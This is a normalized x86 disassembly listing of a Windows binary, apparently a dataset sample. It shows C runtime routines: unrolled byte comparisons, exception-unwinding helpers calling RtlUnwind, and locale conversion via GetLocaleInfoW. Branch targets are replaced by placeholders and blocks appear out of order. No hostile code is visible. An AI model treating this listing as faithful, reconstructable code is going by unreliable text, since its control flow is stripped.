sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_4119c8
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_411a90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_411ad0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_411b60
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_411d45
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_411d64
jmp r-xdata
sub_411b60
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_407abb
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_411ad0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_411bc2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_411bf2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_411c30
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411c50
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_407abb
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_411c95
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_411c95
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_411c50
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_411d45
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_411d64
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_411d3c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_411d45
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_411d67
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_407abb
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40972b
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_40ac3c
pop ecx
cmp eax esi
je r-xdata
call sub_40e650
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_411e41
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
